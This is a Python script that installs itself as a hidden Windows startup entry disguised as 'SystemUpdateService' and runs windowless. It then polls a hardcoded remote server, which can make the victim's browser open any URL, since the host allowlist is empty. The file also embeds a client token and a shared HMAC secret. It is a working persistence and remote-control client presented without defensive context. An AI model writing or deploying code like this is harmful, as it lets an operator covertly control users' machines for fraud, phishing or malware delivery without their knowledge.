import time, sys, webbrowser, urllib.parse, requests, hmac, hashlib, json
import platform
import os

SERVER="https://1cdd6837-f6cd-49c1-93fb-0c9d0f8d06c5-00-emy2rk0fxfzq.picard.replit.dev"
CLIENT_TOKEN="e634d989-911c-4bb2-83bd-99ccb7bb5c25"
POLL_INTERVAL=3
BACKOFF_MAX=60
ALLOWLIST=set()
SHARED_SECRET=b"510121f21311916ba5427ce48892515c8f0b240469f8532424c39c625f7fba1e"

def hostname(u):
    try:
        return urllib.parse.urlparse(u).hostname
    except:
        return None

def verify(payload, signature):
    try:
        mac=hmac.new(SHARED_SECRET, payload.encode("utf-8"), hashlib.sha256).hexdigest()
        return hmac.compare_digest(mac, signature)
    except:
        return False

def add_to_startup():
    sys_name = platform.system()
    if sys_name == "Windows":
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            script_path = os.path.abspath(sys.argv[0])
            winreg.SetValueEx(key, "SystemUpdateService", 0, winreg.REG_SZ, f'pythonw "{script_path}"')
            winreg.CloseKey(key)
        except:
            pass

def poll_loop():
    backoff=POLL_INTERVAL
    while True:
        try:
            r=requests.get(f"{SERVER}/next", params={"token":CLIENT_TOKEN}, timeout=10)
            
            if r.status_code==200:
                backoff=POLL_INTERVAL
                data=r.json()
                url=data.get("url")
                sig=data.get("sig","")
                
                if url:
                    body=json.dumps({"url":url}, separators=(',', ':'))
                    if not verify(body, sig):
                        time.sleep(1); continue
                    
                    h=hostname(url)
                    if not h:
                        continue
                    
                    if ALLOWLIST and h not in ALLOWLIST:
                        continue
                    
                    try:
                        webbrowser.open(url)
                    except:
                        pass
                else:
                    pass
            elif r.status_code==204:
                backoff=POLL_INTERVAL
            elif 500 <= r.status_code < 600:
                pass  # Server error, retry with backoff
            else:
                pass  # Unexpected, retry with backoff
            
            time.sleep(backoff)
        except KeyboardInterrupt:
            sys.exit(0)
        except requests.exceptions.RequestException:
            time.sleep(min(backoff, BACKOFF_MAX))
            backoff=min(backoff*2 if backoff>0 else 1, BACKOFF_MAX)
        except Exception:
            time.sleep(min(backoff, BACKOFF_MAX))
            backoff=min(backoff*2 if backoff>0 else 1, BACKOFF_MAX)

if __name__=="__main__":
    add_to_startup()
    poll_loop()